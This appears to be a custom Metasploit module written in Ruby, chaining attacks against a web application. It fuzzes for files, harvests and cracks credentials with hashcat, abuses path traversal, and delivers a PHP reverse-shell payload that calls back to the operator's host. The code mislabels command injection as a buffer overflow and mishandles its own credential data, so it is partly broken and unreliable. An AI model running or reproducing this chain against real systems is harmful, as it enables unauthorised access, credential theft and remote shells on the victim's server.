class MetasploitModule < Msf::Auxiliary
    include Msf::Exploit::Remote::HttpClient
  
    def initialize(info = {})
      super(update_info(info,
        'Name'           => 'Custom Exploit Script',
        'Description'    => %q{
          This module exploits a vulnerable web application by fuzzing for files,
          extracting user credentials, and exploiting a buffer overflow to gain access.
        },
        'Author'         => [ 'Your Name' ],
        'License'        => MSF_LICENSE,
        'References'     => [ ]
      ))
  
      register_options(
        [
          Opt::RPORT(8080),
          OptString.new('TARGETURI', [ true, 'The base path of the application', '/' ]),
          OptPath.new('PASSWORDS_LIST', [ true, 'Path to the passwords list' ]),
          OptPath.new('WEB_CONTENTS_LIST', [ true, 'Path to the web contents file list' ]),
          OptString.new('USERNAME', [ true, 'Username for login' ]),
          OptString.new('PASSWORD', [ true, 'Password for login' ]),
          OptInt.new('REV_PORT', [ true, 'Reverse shell port', 4444 ])
        ]
      )
    end
  
    def run
      target_url = normalize_uri(datastore['TARGETURI'])
  
      print_status("Target: #{rhost}:#{rport}#{target_url}")
  
      # Step 1: Fuzzing for files
      discovered_files = fuzz_files(target_url)
  
      # Step 2: Extract credentials from users.json
      credentials = extract_credentials(target_url)
  
      # Step 3: Validate credentials using hashcat
      valid_users = validate_credentials(credentials, datastore['PASSWORDS_LIST'])
  
      # Step 4: Exploit path traversal to extract admin file
      admin_file = exploit_path_traversal(target_url, valid_users.first)
  
      # Step 5: Extract admin credentials
      admin_credentials = extract_credentials(target_url, admin_file)
  
      # Step 6: Exploit buffer overflow to gain shell access
      exploit_buffer_overflow(admin_credentials)
    end
  
    def fuzz_files(base_url)
      file_list = File.read(datastore['WEB_CONTENTS_LIST']).split("\n").map(&:strip)
      discovered_files = []
  
      file_list.each do |file|
        res = send_request_cgi({
          'uri' => normalize_uri(base_url, file),
          'method' => 'GET'
        })
  
        if res && res.code != 404
          print_good("Discovered file: #{file}")
          discovered_files << file
        end
      end
  
      discovered_files
    end
  
    def extract_credentials(base_url, file = 'users.json')
      res = send_request_cgi({
        'uri' => normalize_uri(base_url, file),
        'method' => 'GET'
      })
  
      if res && res.body
        usernames = res.body.scan(/"username":\s*"([^"]+)"/).flatten
        passwords = res.body.scan(/"password":\s*"([^"]+)"/).flatten
  
        usernames.zip(passwords).to_h
      else
        print_error("Failed to fetch #{file}")
        {}
      end
    end
  
    def validate_credentials(credentials, password_list)
      valid_users = []
  
      credentials.each do |user, hash|
        `hashcat -m 100 -a 0 --show #{hash} #{password_list}`.split("\n").each do |line|
          valid_users << { username: user, password: line.split(":").last }
        end
      end
  
      valid_users
    end
  
    def exploit_path_traversal(base_url, credentials)
      res = send_request_cgi({
        'uri' => normalize_uri(base_url, 'dashboard.php?dir=.'),
        'cookie' => "username=#{credentials[:username]}; password=#{credentials[:password]}"
      })
  
      if res && res.body =~ /(admins[^\"]+)/
        $1
      else
        print_error("Failed to exploit path traversal")
        nil
      end
    end
  
    def exploit_buffer_overflow(admin_credentials)
      reverse_ip = Rex::Socket.source_address(rhost)
      reverse_port = datastore['REV_PORT']
  
      payload = "$(php -r '\$sock=fsockopen("#{reverse_ip}",#{reverse_port});exec("/bin/sh -i <%263 >%263 2>%263");')"
  
      admin_credentials.each do |admin|
        res = send_request_cgi({
          'uri' => normalize_uri(datastore['TARGETURI'], 'admin.php'),
          'method' => 'POST',
          'cookie' => "username=#{admin[:username]}; password=#{admin[:password]}",
          'data' => { username: admin[:username], payload: payload }
        })
  
        if res && res.code == 200
          print_good("Buffer overflow payload delivered successfully")
          return
        end
      end
  
      print_error("Failed to deliver buffer overflow payload")
    end
  end
  